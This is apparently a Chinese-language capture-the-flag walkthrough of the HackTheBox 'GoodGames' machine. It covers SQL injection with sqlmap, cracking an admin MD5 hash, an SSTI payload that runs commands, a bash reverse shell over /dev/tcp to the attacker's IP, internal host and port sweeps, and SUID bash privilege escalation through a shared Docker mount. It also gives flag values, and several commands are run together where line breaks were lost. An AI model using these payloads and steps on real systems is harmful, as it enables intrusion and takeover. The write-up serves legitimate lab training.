03

测试过程



启动靶机后需要连接htb的vpn，这里使用openvpn后台打开就可以：
nohup openvpn lab_sjdjdan.ovpn &ping -c 3 10.129.96.71



首先使用nmap直接来一波全面扫描：
nmap -A 10.129.96.71


从扫描结果中可以看出该靶机只开启了一个80端口，http头里面有一个werkzeug
查阅有关werkzeug的介绍
https://www.cnblogs.com/tcctw/p/10700540.html
按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集，后来发展成了现在非常流行的WSGI工具库。Werkzeug可以在程序中单独使用，也作为许多Python Web框架的底层库，例如现在非常流行的Flask Web框架。


使用浏览器访问：


这里可以看出该网站是一个和游戏相关的网站，在顶部发现了blog和coming-soon这两个目录。


这两个目录下没找到什么可用的信息，回到主页中，发现了右上角有一个小人的图标。通过这个登录框，找到了一个用户注册的界面：


这里注册一个qwe@qwe.com/123456用户


使用刚刚注册好的用户去登录


跳转后页面中有一个修改密码的按钮，但是输入了好像不起作用，会报错500


目录扫描尝试一下：
dirsearch -u http://10.129.96.71

但是好像并没有什么可用的信息。

回想到刚刚有个登录框，结合这个靶机的相关标签sql注入，所以去尝试一下sql注入是否存在？
首先返回到主页面中退出登录，然后打开burp，登录时抓包并发送到重放模块中：


将返回包保存为文件，然后使用sqlmap去跑是否存在注入：


sqlmap -r test


从图中可以看出来确实是存在注入的，接下来就是把来获取相关的数据：
sqlmap -r test --current-db   #获取当前数据库名


这里可以看到当前使用的数据库名为main
sqlmap -r test -D main --tables #获取main库中的表名


这里可以看到有user、bolg、bolg_comments 这三个表，后面两个表看起来没什么想要的信息，下面获取user这个表中的数据：
sqlmap -r test  -D main -T user --dump


这里爆破出了admin@goodgames.htb邮箱密码的md5值：2b22337f218b2d82dfc3b6f77e7cb8ec，拿去
https://hashes.com/en/decrypt/hash

解密一下。

成功解出admin的密码为superadministrator


利用admin@goodgames.htb/superadministrator去登录到网站中


成功登录上来，发现右上角多了一个小齿轮按钮，点击这个小齿轮按钮会跳转到域名：


在/etc/hosts目录下添加域名解析即可正常访问：

echo "10.129.96.71 GoodGames.htb internal-administration.goodgames.htb" >> /etc/hosts


继续使用admin/superadministrator用户来登录（这里原本我以为是和之前一样的邮箱，实际上是admin）


在这个后台页面翻来翻去再根据靶机的相关标签SSTI，最终在settings的更改姓名的文本框中发现了相关漏洞。

python SSTI的相关知识：
https://cloud.tencent.com/developer/article/1637529



这里的payload为：
{{ namespace.__init__.__globals__.os.popen('id').read() }}


尝试反弹shell，将反弹shell的命令填写到os模块的popen函数中。

首先查看本机htb分配的IP地址
ifconfig


这里可以看到IP为：10.10.14.9，然后使用bash一句话木马来反弹shell：
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.9/1234 0>&1"').read() }}


攻击机监听1234端口后网页中点击保存：


成功接收到shell

查找第一个flag，直接find全局搜索：
find /. -name user.txt

得到第一个flag：5be5c97ba28e8cb66a5750f38534d99d


对主机进行一些信息收集后，发现该主机为docker容器，并且该主机的/home/augustus目录下的文件和主机互相映射：



对172.19.0.0/24这个c段进行一个ping扫描，查看下内网中还存在其它主机：
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;


这里还发现了一个172.19.0.1的主机，对该主机来一个全端口扫描：
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null


这里发现了开启了22和80端口，尝试使用刚刚主机中的augustus用户和之前解密得到的密码来使用ssh连接过去：
ssh augustus@172.19.0.1


这里报错了，网上搜索了一下Pseudo-terminal will not be allocated because stdin is not a terminal.发现了是因为伪终端无法分配，需要提升为交互式终端。
一开始就知道该靶机是由python环境搭建的，直接使用python来提升实现交互式shell，然后再去连接ssh即可
 python3 -c 'import pty; pty.spawn("/bin/bash")'


查看本机的ip和有关docker的进程：

ip aps aux |grep docker

这里可以看到一个ens192的网卡，可以确认这是最终的靶机了。


根据之前发现的挂载信息两边的文件都是同步的，那么这里可以直接返回到容器中创建一个bash文件，将其设为suid，然后在回到最终的靶机来运行就可以得到root权限了：
cp /bin/bash /home/augustus/chmod 4777 bashssh augustus@172.19.0.1



这里报了个错误，网上搜索后发现缺少libtinfo.so.5的二进制文件，那么这里换个手法：通过靶机的bash复制到当前目录下，再回到容器中去修改相关权限问题：
rm bashcp /bin/bash ./exit


chmod 4777 bashchown root:root bashssh augustus@172.19.0.1


./bash -pcd /rootcat root.txt


成功拿到靶机的最终flag。
